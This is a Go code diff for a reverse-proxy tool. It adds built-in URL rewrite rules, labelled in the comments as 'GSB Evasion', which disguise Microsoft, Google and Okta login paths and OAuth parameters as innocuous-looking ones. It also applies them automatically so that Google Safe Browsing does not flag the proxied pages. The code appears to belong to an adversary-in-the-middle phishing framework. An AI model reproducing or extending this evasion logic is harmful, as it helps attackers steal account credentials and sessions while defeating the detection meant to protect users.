@@ -2775,3 +2775,179 @@ func (m *Proxy) DeleteByID(
 
 	return nil
 }
+
+// ─── Built-in URL Rewrite Rules for GSB Evasion ──────────────────────────────
+// These methods generate recommended URL rewrite rules for known login paths
+// that Google Safe Browsing uses for pattern-based detection.
+
+// GetBuiltinRewriteRulesForDomain returns recommended URL rewrite rules for a
+// given target domain. These rules rewrite well-known authentication paths
+// (which GSB uses for URL pattern matching) to innocuous-looking paths.
+// Returns nil if no built-in rules exist for the domain.
+func GetBuiltinRewriteRulesForDomain(targetDomain string) []ProxyServiceURLRewriteRule {
+	domain := strings.ToLower(targetDomain)
+
+	switch {
+	case strings.Contains(domain, "login.microsoftonline.com") ||
+		strings.Contains(domain, "login.live.com") ||
+		strings.Contains(domain, "login.microsoft.com"):
+		return getMicrosoftRewriteRules()
+
+	case strings.Contains(domain, "accounts.google.com"):
+		return getGoogleRewriteRules()
+
+	case strings.Contains(domain, "okta.com"):
+		return getOktaRewriteRules()
+
+	default:
+		return nil
+	}
+}
+
+// getMicrosoftRewriteRules returns rewrite rules for Microsoft login paths
+func getMicrosoftRewriteRules() []ProxyServiceURLRewriteRule {
+	return []ProxyServiceURLRewriteRule{
+		{
+			Find:    "/common/oauth2/v2.0/authorize",
+			Replace: "/auth",
+			Query: []ProxyServiceURLRewriteQueryParam{
+				{Find: "client_id", Replace: "cid"},
+				{Find: "redirect_uri", Replace: "ruri"},
+				{Find: "response_type", Replace: "rt"},
+				{Find: "scope", Replace: "s"},
+				{Find: "response_mode", Replace: "rm"},
+				{Find: "state", Replace: "st"},
+				{Find: "nonce", Replace: "n"},
+			},
+		},
+		{
+			Find:    "/common/login",
+			Replace: "/signin",
+		},
+		{
+			Find:    "/common/oauth2/authorize",
+			Replace: "/connect",
+			Query: []ProxyServiceURLRewriteQueryParam{
+				{Find: "client_id", Replace: "cid"},
+				{Find: "redirect_uri", Replace: "ruri"},
+				{Find: "response_type", Replace: "rt"},
+			},
+		},
+		{
+			Find:    "/common/reprocess",
+			Replace: "/verify",
+		},
+		{
+			Find:    "/common/SAS/ProcessAuth",
+			Replace: "/check",
+		},
+		{
+			Find:    "/GetCredentialType.srf",
+			Replace: "/lookup",
+		},
+		{
+			Find:    "/ppsecure/post.srf",
+			Replace: "/submit",
+		},
+		{
+			Find:    "/common/GetSessionState",
+			Replace: "/status",
+		},
+	}
+}
+
+// getGoogleRewriteRules returns rewrite rules for Google login paths
+func getGoogleRewriteRules() []ProxyServiceURLRewriteRule {
+	return []ProxyServiceURLRewriteRule{
+		{
+			Find:    "/o/oauth2/v2/auth",
+			Replace: "/connect",
+			Query: []ProxyServiceURLRewriteQueryParam{
+				{Find: "client_id", Replace: "cid"},
+				{Find: "redirect_uri", Replace: "ruri"},
+				{Find: "response_type", Replace: "rt"},
+				{Find: "scope", Replace: "s"},
+			},
+		},
+		{
+			Find:    "/ServiceLogin",
+			Replace: "/login",
+		},
+		{
+			Find:    "/signin/v2/challenge",
+			Replace: "/step",
+		},
+		{
+			Find:    "/signin/v2/sl/pwd",
+			Replace: "/auth",
+		},
+		{
+			Find:    "/_/signin/sl/lookup",
+			Replace: "/find",
+		},
+	}
+}
+
+// getOktaRewriteRules returns rewrite rules for Okta login paths
+func getOktaRewriteRules() []ProxyServiceURLRewriteRule {
+	return []ProxyServiceURLRewriteRule{
+		{
+			Find:    "/oauth2/default/v1/authorize",
+			Replace: "/connect",
+			Query: []ProxyServiceURLRewriteQueryParam{
+				{Find: "client_id", Replace: "cid"},
+				{Find: "redirect_uri", Replace: "ruri"},
+				{Find: "response_type", Replace: "rt"},
+				{Find: "scope", Replace: "s"},
+			},
+		},
+		{
+			Find:    "/api/v1/authn",
+			Replace: "/verify",
+		},
+		{
+			Find:    "/login/login.htm",
+			Replace: "/signin",
+		},
+	}
+}
+
+// AutoApplyBuiltinRewriteRules scans the proxy config for known target domains
+// and automatically adds built-in rewrite rules if none are configured.
+// This is called during proxy config compilation to ensure GSB evasion is active.
+// It only adds rules if the domain has no user-defined rewrite_urls rules.
+func AutoApplyBuiltinRewriteRules(config *ProxyServiceConfigYAML) bool {
+	if config == nil {
+		return false
+	}
+
+	applied := false
+
+	for proxyDomain, domainConfig := range config.Hosts {
+		if domainConfig == nil {
+			continue
+		}
+
+		targetDomain := domainConfig.To
+		if targetDomain == "" {
+			continue
+		}
+
+		// skip if user already has rewrite rules configured for this domain
+		if len(domainConfig.RewriteURLs) > 0 {
+			continue
+		}
+
+		builtinRules := GetBuiltinRewriteRulesForDomain(targetDomain)
+		if builtinRules == nil {
+			continue
+		}
+
+		// apply built-in rules
+		domainConfig.RewriteURLs = builtinRules
+		config.Hosts[proxyDomain] = domainConfig
+		applied = true
+	}
+
+	return applied
+}
